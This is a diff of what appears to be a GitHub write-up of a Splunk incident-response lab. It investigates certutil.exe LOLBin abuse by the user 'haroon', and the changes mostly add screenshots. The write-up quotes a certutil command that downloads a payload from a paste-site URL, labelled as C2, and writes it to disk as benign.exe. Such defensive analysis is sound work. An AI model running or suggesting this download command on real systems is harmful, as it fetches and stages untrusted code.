@@ -1,4 +1,4 @@
-<h1>Insider Threat & LOLBin Analysis: Incident Response Investigation via Splunk</h1>
+<img width="745" height="534" alt="image" src="https://github.com/user-attachments/assets/0bb6f367-f21b-4b54-a987-6b87f03f92c5" /><h1>Insider Threat & LOLBin Analysis: Incident Response Investigation via Splunk</h1>
 
 <br>
 <h2>Executive Summary</h2>
@@ -91,15 +91,26 @@
 </p>
 <p><img width="877" height="452" alt="image" src="https://github.com/user-attachments/assets/c92f900f-30b5-4ff3-a85a-4263ff53c8ba" />
 </p>
+<p><img width="745" height="534" alt="image" src="https://github.com/user-attachments/assets/59df53aa-b24e-4fe0-af6a-57e166e09d1f" />
+</p>
+<p><img width="745" height="534" alt="image" src="https://github.com/user-attachments/assets/45fd6ee9-a823-41c7-8e4a-9c787873e322" />
+</p>
 <p>This analysis targeted the user <b>haroon</b>. The data revealed that the threat actor abused a native <b> Windows Living-off-the-Land Binary (LOLBin)</b> — <b>certutil.exe</b> — to bypass traditional application whitelisting and network perimeters.</p>
 <p>On <b>March 4, 2022</b>, the compromised host executed the following command to reach out to the internet, retrieve a payload from a text-hosting platform, and write it to disk:</p>
 
     certutil.exe -urlcache -f https://controlc.com/e4d11035 benign.exe
 
+<p><img width="902" height="490" alt="image" src="https://github.com/user-attachments/assets/d9143261-72bd-4976-9a77-ab28af2066c7" />
+</p>
 <ul>
   <li><b>Abused Binary:</b> <i>certutil.exe</i> (utilizing the <i>-urlcache</i> flag to download remote files).</li>
   <li><b>Command and Control (C2) Infrastructure:</b> <i>[https://controlc.com/e4d11035](https://controlc.com/e4d11035)</i></li>
+  <p><img width="902" height="490" alt="image" src="https://github.com/user-attachments/assets/a33fb1e7-e328-4f19-b535-9a223921348f" />
+</p>
   <li><b>Dropped Payload:</b> <i>benign.exe</i> (staged locally during the post-exploitation phase).</li>
+  <li>Investigated the third-party site, <b>https://controlc.com/e4d11035</b> (which is the URL that the infected host connected to), and analyzed the pattern of the suspicious file downloaded from the C2 server malicious content.</li>
+  <p><img width="842" height="502" alt="image" src="https://github.com/user-attachments/assets/b1b7ca57-dd0b-4708-9e5a-3f744c105745" />
+</p>
 </ul>
 
 
